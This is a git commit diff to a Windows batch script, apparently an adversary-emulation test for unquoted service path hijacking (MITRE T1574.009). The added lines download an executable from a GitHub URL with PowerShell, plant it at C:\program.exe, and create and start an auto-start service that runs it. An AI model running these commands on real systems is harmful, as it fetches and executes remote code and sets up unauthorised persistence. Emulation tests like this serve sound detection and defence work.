f7d88e9918ce40affafc34c67cf2ea412b3daa94
void010 <50961936+void010@users.noreply.github.com>
2021-03-17 15:53:36 +0530

    Update unquoted_service_create(T1574.009).bat

--- T1574.009/unquoted_service_create(T1574.009).bat
+++ T1574.009/unquoted_service_create(T1574.009).bat
@@ -2,8 +2,9 @@
 
 echo Starting Execution
 
-copy C:\users\alfred.v\Desktop\calc.exe "C:\Program Files\program.exe"
-copy C:\users\alfred.v\Download\cpp_poc_64.exe "C:\program.exe"
+copy C:\Windows\System32\calc.exe "C:\Program Files\program.exe"
+powershell -Command "Invoke-WebRequest https://github.com/void010/dummy/raw/main/cpp_poc_64.exe -OutFile C:\users\alfred.v\Downloads\cpp_poc_64.exe"
+copy C:\users\alfred.v\Downloads\cpp_poc_64.exe "C:\program.exe"
 sc create "Example Service" binpath= "C:\Program Files\program.exe" Displayname= "Example Service" start= auto
 sc start "Example Service"
 
